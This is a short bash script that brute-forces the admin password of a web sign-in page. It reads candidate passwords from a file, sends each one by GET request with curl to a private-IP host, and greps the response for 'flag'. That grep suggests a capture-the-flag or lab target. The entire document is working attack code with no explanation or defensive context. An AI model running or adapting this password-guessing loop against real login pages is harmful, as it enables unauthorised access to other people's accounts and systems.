#!/bin/bash

urlStart="http://192.168.148.128/?page=signin&username=admin&password="
urlEnd="&Login=Login#"

while IFS='' read -r line || [[ -n "$line" ]]; do
	urlFinal=$urlStart$line$urlEnd
	echo `curl -X GET $urlFinal | grep flag`
done < "$1"